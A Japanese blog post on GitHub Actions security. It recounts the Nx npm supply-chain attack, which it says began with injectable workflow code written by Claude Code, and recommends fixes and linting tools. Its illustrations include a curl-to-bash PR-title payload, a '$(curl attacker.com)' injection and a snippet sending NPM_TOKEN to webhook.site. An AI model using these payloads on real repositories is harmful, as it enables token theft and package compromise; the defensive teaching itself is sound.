---
title: 今日から学ぶGitHub Actionsのセキュリティ設定の基本と最低限の対策
slug: github-actions-security-basics-minimum-measures
date: 2025-11-17
modified_time: 2025-11-17
description: GitHub Actionsで発生しうるScript InjectionやPull Request Target、権限の過剰付与などの脆弱性と、actionlint・ghalint・zizmor等の静的解析ツールを使った具体的な対策方法を解説します。
icon: 🚓
icon_url: /icons/police_car_flat.svg
tags:
  - GitHub
  - GitHubActions
  - セキュリティ
---
## はじめに

あなたのチームでは、GitHub Actions を使っていますか？

おそらく使っているでしょう。CI/CD パイプラインの構築、自動テスト、デプロイ自動化など、GitHub Actions は現代の開発フローに欠かせないツールです。しかし、便利だからこそ後回しになりがちなのが「セキュリティ設定」です。

2025 年 8 月 26 日、JavaScript のビルドツールとして広く使われているNxにおいて、攻撃者によって複数の悪意のあるバージョンが公開される事件が発生しました。この攻撃で 900 人以上が被害を受け、API キーなどの機密情報が流出しました。

原因は、GitHub Actions のワークフロー設定に含まれていたScript Injectionの脆弱性でした。

では、以下のワークフローのどこに問題があるか分かりますか？
```yml
name: PR Title Validation

on:
  pull_request:
    types: [opened, edited, synchronize, reopened]
  pull_request_target:
    types: [opened, edited, synchronize, reopened]

jobs:
  validate-pr-title:
    if: ${{ github.repository_owner == 'nrwl' }}
    name: Validate PR Title
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          # For pull_request_target, we need to checkout the base branch
          ref: ${{ github.event.pull_request.base.ref }}

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Create PR message file
        run: |
          mkdir -p /tmp
          cat > /tmp/pr-message.txt << 'EOF'
          ${{ github.event.pull_request.title }}
          
          ${{ github.event.pull_request.body }}
          EOF
          
      - name: Validate PR title
        run: |
          echo "Validating PR title: ${{ github.event.pull_request.title }}"
          node ./scripts/commit-lint.js /tmp/pr-message.txt
```

この記事では GitHub Actions のセキュリティ脆弱性と、今日から実践できる具体的な対策を解説します。「小さいプロジェクトだから大丈夫」と思わず、明日は我が身と思い学んでいきましょう。

## 有名ビルドツールへの攻撃
2025 年 8 月 26 日、JavaScript のよく利用されているビルドツールの 1 つである Nx において、複数の悪意のあるバージョンが攻撃者によって公開されました。

攻撃の内容は Claude Code が作成したコードに `Script Injection` の脆弱性が含まれていたことが発端です。
`Script Injection` とは一般的には被害者のブラウザに悪意のスクリプト(大部分は JavaScript のコード)が入り込み、ブラウザの内側からセキュリティ侵害が起こる問題です。

https://www.ipa.go.jp/archive/security/vuln/programming/web/chapter7/7-1.html

このPull Request自体は Nx の開発チームメンバーによるもので悪意はありませんでしたが、タイトル検証ワークフローに以下のようなコードが含まれていました。

```yaml
run: |
  echo "Validating PR title: ${{ github.event.pull_request.title }}"
```

この部分で、タイトルに仕込まれたシェルスクリプトがそのまま実行されてしまいます。
たとえば以下のような内容がPull Requestのタイトルだとどうなるでしょうか？

```md
/bin/bash -c "$(curl-fsSL https://example.com/script.sh)"
```

攻撃者はこの脆弱性を発見し、`pull_request_target` トリガを利用して権限昇格を行いました。
`pull_request_target` は、フォーク PR でも Secret が展開され、read/write 権限を持つ `GITHUB_TOKEN` が自動的に発行されます。

攻撃者はこの `GITHUB_TOKEN` を盗み取り、`publish.yml` ワークフローを不正に実行しました。

`publish.yml` は npm パッケージを公開するための重要なワークフローで、NPM_TOKEN を環境変数として持っています。攻撃者は悪意あるコミットで `publish.yml` を改ざんし、以下のようなコードで NPM_TOKEN を外部に送信しました。

```javascript
const npmToken = process.env.NODE_AUTH_TOKEN;
exec(`curl -d "${npmToken}" https://webhook.site/...`);
```

盗み取った NPM_TOKEN を使い、攻撃者は約 2 時間で複数の悪意のあるバージョンを公開しました。
これらのパッケージには postinstall スクリプトが含まれ、インストールと同時に秘密情報を収集するしくみになっており、900 人以上が被害を受けました。

これは Nx だけの問題じゃありません。同じパターンは誰にでも起こりえます。たとえば個人開発でいろいろ開発環境を整えているうちに、CI/CD パイプラインを構築することや、OSS の作成なども考えられるでしょう。
そのときに脆弱になりやすい場所は最低限、知識として理解しておくべきです。
## 知るべき脆弱性
今回は GitHub Actions で発生する可能性が高よいくつかの脆弱性を紹介していきます。1 つ目は**pull_request_target**です。
前提として、GitHub Actions における `pull_request` と `pull_request_target` の違いを明確にします。

`pull_request` は、外部から送られるPull Requestに対しては秘匿情報を扱わず、権限も読み取りに限定されます。Pull Requestで提出されたコードをそのまま実行しても、リポジトリや機密情報が危険にさらされないように設計されたしくみです。

```yml
## テストだけ行うワークフローの例
on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

一方で `pull_request_target` は、Pull Requestのベースとなるリポジトリ側の設定(main ブランチなど)を用いて実行されます。
そのため、フォークされたリポジトリからの提案であっても秘匿情報や書き込み権限を扱えます。便利である反面、扱いを誤れば、その権限が攻撃者に開かれてしまう危険性があります。
```yml
## PR 自体にラベルを付与するワークフロー(Secret や write 権限が必要)の例
on:
  pull_request_target:
    types: [opened]

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.addLabels({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              labels: ["needs-review"]
            })
```
この場合、ベースブランチ権限で API を実行するため、Pull Requestが悪意ある場合に同じ権限を悪用されるリスクが存在します。

基本方針としては `pull_request` を用い、`pull_request_target` はやむを得ない場合にのみ使用します。そのときは、信頼できるPull Request(例: `safe to test` ラベル付与済み)に限定して実行するなど、厳格な制御を行うことが推奨されます。

2 つ目は**Script Injection**です。冒頭にあった yml にある `${{ github.event.pull_request.title }}` を直接展開すると、タイトルにシェルスクリプトを仕込まれたときにそのまま実行されてしまいます。
```yaml
run: echo "PR title: ${{ github.event.pull_request.title }}"
```

タイトルが `$(curl attacker.com)` だった場合、このコマンドが実行されてしまいます。
対策として、環境変数経由で値を渡すのが一般的です。
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "PR title: $PR_TITLE"
```

3 つ目は**権限の過剰付与**です。古いリポジトリはデフォルトで read/write 権限になっている場合があります。最小権限の原則に従い、必要最低限の権限だけを設定することで、権限の過剰設定を防止します。

最小権限の原則とは、「必要最低限の権限だけを与える」というセキュリティの基本思想です。
たとえば、単にテストを実行するだけのワークフローに「リポジトリへの書き込み権限」を与える必要はありません。もし攻撃者がそのワークフローを乗っ取った場合、read 権限しかなければコードを改ざんできませんが、write 権限があれば悪意のあるコードをコミットできてしまいます。
対策として、ワークフロー全体で `permissions: {}` を設定し、個別 Job で必要な権限のみ付与します。
```yaml
name: CI

## ワークフロー全体で全権限を剥奪
permissions: {}

jobs:
  test:
    runs-on: ubuntu-latest
    # このJobでは読み取りのみ必要
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<commit-hash>
      - run: npm test
```


## 今日からできる対策

セキュリティ対策を完璧にするのはとても難しいです。まずはできる部分の対策から始め、段階的に強化していくことが現実的です。

### 最低限の対策

まず取り組むべきは、Script Injection の修正、権限の見直し、トリガの見直しの 3 つです。

既存ワークフローで外部入力を直接展開している箇所を環境変数経由に変更してください。たとえば、`${{ github.event.pull_request.title }}` のような記述を見つけ、以下のように修正します。

```yaml
## 修正前
run: echo "PR title: ${{ github.event.pull_request.title }}"

## 修正後
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "PR title: $PR_TITLE"
```

次に、各ワークフローで権限設定を見直します。ワークフロー全体で `permissions: {}` を設定し、個別 Job で必要最低限の権限のみを付与してください。

最後に、不要な `pull_request_target` は `pull_request` に変更します。`pull_request_target` は本当に必要な場合のみ使用し、その場合も信頼できるPull Requestに限定して実行するなど、厳格な制御を行ってください。

### 静的解析ツールの導入

とはいっても複数ある GitHub Actions の設定を手動で変えていくのは億劫です。actionlint、ghalint、zizmor といった静的解析ツールを導入することで、既存ワークフローの問題点を自動検出できます。
これらのツールを環境の差異なく使用するために、CLI ツールのバージョン管理ツールである aqua をインストールします。

```bash
## aqua-installerのチェックサムを検証してインストール
curl -sSfL -O https://raw.githubusercontent.com/aquaproj/aqua-installer/v4.0.2/aqua-installer
echo "98b883756cdd0a6807a8c7623404bfc3bc169275ad9064dc23a6e24ad398f43d  aqua-installer" | sha256sum -c -
chmod +x aqua-installer
./aqua-installer

## 環境変数PATHの設定(Linux or MacOS)
export PATH="${AQUA_ROOT_DIR:-${XDG_DATA_HOME:-$HOME/.local/share}/aquaproj-aqua}/bin:$PATH"

aqua -v
## aqua version 2.55.1

## 初期化
aqua init
```
実行すると `aqua.yaml` が作成されますので、関連するツールをインストールしていきましょう。
```yaml aqua.yaml
---
## yaml-language-server: $schema=https://raw.githubusercontent.com/aquaproj/aqua/main/json-schema/aqua-yaml.json
## aqua - Declarative CLI Version Manager
## https://aquaproj.github.io/
## checksum:
##   enabled: true
##   require_checksum: true
##   supported_envs:
##   - all
registries:
- type: standard
  ref: v4.436.0  # renovate: depName=aquaproj/aqua-registry
packages:

```
次に以下のコマンドを実行して静的解析ツールをインストールするための設定を追加します。
```bash
## インストール
aqua g -i rhysd/actionlint
aqua g -i suzuki-shunsuke/ghalint
aqua g -i zizmorcore/zizmor
aqua g -i suzuki-shunsuke/pinact
```
作成後は `aqua i` で CLI ツールをインストールします。エラーがなければインストール成功です！
その他、詳しい情報については公式ドキュメントまたは Zenn Book をご確認ください。

https://aquaproj.github.io/

https://zenn.dev/shunsuke_suzuki/books/aqua-handbook

詳しいツールの説明については以下の記事とても丁寧に解説されていますので、詳細はこちらの記事をご確認ください。本記事ではツールの実行方法に絞って説明します。

https://zenn.dev/kou_pg_0131/articles/gha-static-checker

`actionlint` は、GitHub Actions のワークフローファイルを静的解析するツールです。Script Injection や構文エラーを検出できます。

```bash
actionlint

## JSONで出力する例
actionlint -format '{{json .}}'
```

ghalint は、job の permissions 指定の必須化や、コミットハッシュによるアクション参照の必須化をチェックするツールです。
```bash
ghalint run
```

zizmor は、過剰な permissions やテンプレート展開によるコードインジェクションを検出します。

```bash
zizmor .github/workflows/
```

pinact は、GitHub Actions で使用しているアクションのバージョンをコミットハッシュに自動変換するツールです。ghalint でコミットハッシュ参照が推奨されても、手動で変換するのは手間がかかります。pinact を使用することで、既存のワークフローを一括でコミットハッシュ参照に変換できます。

```bash
## タグをコミットハッシュに変換
pinact run
```

### CodeQLの有効化

GitHub が提供する無料のセキュリティスキャンである CodeQL を有効化します。パブリックリポジトリなら無料で使え、Nx 事件もこれで防げた可能性があります。設定方法については、[公式ドキュメント](https://docs.github.com/ja/code-security/code-scanning/introduction-to-code-scanning/about-code-scanning-with-codeql)を参照してください。

## 実装例

前節で紹介したツールの詳細な設定方法を解説します。
毎回ツールを実行するのはとても面倒です。Claude Code のカスタムスラッシュコマンドを使い、GitHub Actions の設定を修正したときに一通り実行できるようにしておきましょう。
```md .claude/commands/actions-check.md
---
description: GitHub Actionsの静的検査を行い、エラーを修正します。
---

以下のコマンドはGitHub Actionsの構文を静的解析するツールです。
コマンドを実行後、GitHub Actionsの構文エラーを修正する。
ツールは正常終了時に出力が無い。または成功の出力が出力されます。
`zsh: command not found:`のようなコマンド自体が無い場合でも、ユーザーに報告のみを行い、次のコマンドを実行してください。

1. `pinact run`
2. `actionlint -format '{{json .}}'`
3. `ghalint run`
4. `zizmor .github/`
```

その他にもこれらのツールを GitHub Actions で自動実行する例を示します。[koki-develop/github-actions-lint](https://github.com/koki-develop/github-actions-lint) は GitHub Actions でこれらのツールを使うための Action です。
```yaml .github/workflows/github-actions-lint.yaml
name: GitHub Actions Lint

permissions: {}

on:
  pull_request:
    paths:
      - ".github/**"
  push:
    branches:
      - main
    paths:
      - ".github/**"

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  actionlint:
    timeout-minutes: 5
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
      - uses: koki-develop/github-actions-lint/actionlint@62dfef5c9854a07712bad7af3bee7edb0c1109b1 # v1.4.1

  ghalint:
    timeout-minutes: 5
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
      - uses: koki-develop/github-actions-lint/ghalint@62dfef5c9854a07712bad7af3bee7edb0c1109b1 # v1.4.1
        with:
          action-path: ./.github/actions/**/action.yml

  zizmor:
    timeout-minutes: 5
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
      - uses: koki-develop/github-actions-lint/zizmor@62dfef5c9854a07712bad7af3bee7edb0c1109b1 # v1.4.1
        with:
          github-token: ${{ github.token }}
          persona: auditor
```

## まとめ

- 既存ワークフローで Script Injection をチェックし、`${{ github.event.* }}` の直接展開を環境変数経由に変更する
- ワークフロー全体で `permissions: {}` を設定し、個別 Job で必要最低限の権限のみ付与する
- 不要な `pull_request_target` は `pull_request` に変更する
- actionlint、ghalint、zizmor、pinact といった静的解析ツールを導入する
- 余裕があれば、CodeQL を有効化する

## 参考

- [GitHub Advisory: Malicious versions of Nx](https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c)
- [Nx から npm トークンを窃取した攻撃手法を実験してみる](https://blog.inorinrinrin.com/entry/2025/08/29/064200)
- [Nx の攻撃から学べること](https://blog.jxck.io/entries/2025-09-03/nx-incidents.html)
- [GitHub Docs: Code scanning with CodeQL](https://docs.github.com/ja/code-security/code-scanning/introduction-to-code-scanning/about-code-scanning-with-codeql)
- [GitHub Docs: Using environments for deployment](https://docs.github.com/ja/actions/deployment/targeting-different-environments/using-environments-for-deployment)
- [actionlint - GitHub Actions workflow linter](https://github.com/rhysd/actionlint)
- [ghalint - GitHub Actions Linter](https://github.com/suzuki-shunsuke/ghalint)
- [zizmor - GitHub Actions security scanner](https://github.com/zizmorcore/zizmor)
- [aqua - Declarative CLI Version manager](https://github.com/aquaproj/aqua)
- [サプライチェーン攻撃への防御策](https://blog.jxck.io/entries/2025-09-20/mitigate-risk-of-oss-dependencies.html)
